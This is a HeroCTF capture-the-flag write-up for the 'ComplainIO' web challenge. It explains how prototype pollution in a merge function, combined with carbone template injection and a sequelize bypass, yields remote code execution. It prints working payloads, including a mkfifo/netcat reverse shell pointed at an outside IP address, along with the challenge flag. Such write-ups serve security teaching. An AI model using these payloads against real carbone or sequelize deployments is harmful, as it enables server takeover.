# ComplainIO

### Category

Web

### Description

As a French person, we love to complain, so I've created a platform to automatically create complaint templates - we can't stop progress!

> Deploy on [deploy.heroctf.fr](https://deploy.heroctf.fr/)

Format : **Hero{flag}**<br>
Author : **Worty**

### Write Up

This challenge involves a global prototype pollution to gain remote code execution inside the carbone library. (https://github.com/carboneio/carbone/commit/04f9feb24bfca23567706392f9ad2c53bbe4134e)

The prototype pollution can be triggered when a POST request is made to `/api/create_template` due to this function :

```js
const FORBIDDEN_MODIFIED = ["id","username","password"];
const all_fields = FORBIDDEN_MODIFIED.concat(["firstname","lastname"]);

const merge = (obj1, obj2) => {
    for (let key of Object.keys(obj2)) {
      const val = obj2[key];
      if(FORBIDDEN_MODIFIED.includes(key)) {
        continue
      }
      if (typeof obj1[key] !== "undefined" && typeof val === "object") {
        obj1[key] = merge(obj1[key], val);
      } else {
        obj1[key] = val;
      }
    }
  
    return obj1;
};
```

Example of a request to pollute a random attribute (not related to the challenge) :

```
POST /api/create_template HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/114.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJpYXQiOjE3MjQzNTcyNzd9.0PLLAhb3OEZmqpIi6cAYNa-jN1UXRWK785t3qXh5LQc
X-Requested-With: XMLHttpRequest
Content-Length: 175
Origin: http://localhost:3000
Connection: keep-alive
Referer: http://localhost:3000/complain
Cookie: flarum_remember=JlDQQq89nrmSLiddUNWFhKS62QhHXHa67huQlSE5; spip_admin=%40admin%40localhost
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{
  "firstname":"John",
  "lastname":"",
  "uuid":"1e200be4-009a-4726-9b2b-409e56578746",
  "id":1,
  "__proto__":{
    "polluted":1
  }
}
```

I will not demonstrate the analysis I made in the carbone library, but this library is really well done, very few user inputs are reflected in the template to be evaluated. The carbone library allows developers to call function like this :

```
{d.age:add(2)}
```

In the rendered template, the only user inputs reflected is "add", but we are limited, in fact, if we try to call an undefined function inside carbone library, the renderer will crash and thrown an error. This check can be bypass with a prototype pollution, in fact, in the carbone library code, they are checking that the function exists using the following code :

```js
// lib/builder.js
if (existingFormatters[_functionStr] === undefined) {
  var _alternativeFnName = helper.findClosest(_functionStr, existingFormatters);
  throw Error('Formatter "'+_functionStr+'" does not exist. Do you mean "'+_alternativeFnName+'"?');
}
if ( (existingFormatters[_functionStr].canInjectXML === true && onlyFormatterWhichInjectXML === true)
  || (existingFormatters[_functionStr].canInjectXML !== true && onlyFormatterWhichInjectXML !== true)) {
  _lineOfCodes.push(varName +' = formatters.' + _functionStr + '.call(' + contextName + ', ' + varName + _argumentStr + ');\n');
}
```

In fact, if we try to render : `{d.age:__proto__(2)}`, this code will be bypassed (but the renderer will crash because `__proto__` is not a function obviously).

At this point of the challenge, we observe that we must control the template in order to trigger the code execution, and this can be done because the uploaded profile picture are in the same SQL table than the base templates. Moreover, no check are performed on uploaded files, so a user can upload everything he wants, including carbone templates.

Let's say we have a code execution, the malicious template that will trigger a reverse shell is the following :

```
{d:__proto__;x=Object;w=a=x.constructor.call``;w.type="pipe";w.readable=1;w.writable=1;a.file="/bin/sh";a.args=["/bin/sh","-c","rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/f"];a.stdio=[w,w];ff=Function`process.binding\\x28\\x22spawn_sync\\x22\\x29.spawn\\x28a\\x29.output`;ff.call``//()}
```

Using the prototype pollution we see before, we have to pollute as follows :

```
{
  ...,
  "__proto__":{
    "__proto__;x=Object;w=a=x.constructor.call``;w.type=\"pipe\";w.readable=1;w.writable=1;a.file=\"/bin/sh\";a.args=[\"/bin/sh\",\"-c\",\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 51.77.222.226 4444 >/tmp/f\"];a.stdio=[w,w];ff=Function`process.binding\\x28\\x22spawn_sync\\x22\\x29.spawn\\x28a\\x29.output`;ff.call``//":1,
    "xmlParts":[]
  }
}
```

You can notice the additional `xmlParts` in the json payload, this is mandatory else carbone will crash before executing the template.

There is a last error, in fact, the application is using sequelize to perform SQL queries, but sequelize is fully vulnerable to prototype pollution, and will consider anything in the prototype as a column name. Because a SQL query is performed before rendering the template, if we pollute like this, the platform will be broken.

A way to bypass this behaviour of sequelize is to attack it with also a prototype pollution :

```
{
  ...,
  "__proto__":{
    "raw":1,
    "connection":{
      "uuid":"test"
    },
    "fields":[]
  }
}
```

With this, any SQL query performed by sequelize will not select any column (this broke the platform but this allows us to reach the carbone renderer to perform remote code execution.)

So, the exploit chain is :
  - Upload a malicious profile picture that contains our malicious carbone template
  - Recover the uuid of the uploaded file (we can because it's our profile picture)
  - Perform a prototype pollution to corrupt sequelize
  - Perform a second prototype pollution to pollute the global object with our payload
  - Ask carbone to render our file
  - Gain code execution

You will find this in the `solve.py` file.

### Flag

HERO{m0r3_p0llut10n_pl34s3_456144e3cc5ed95803a2f81baaf3c4bb}
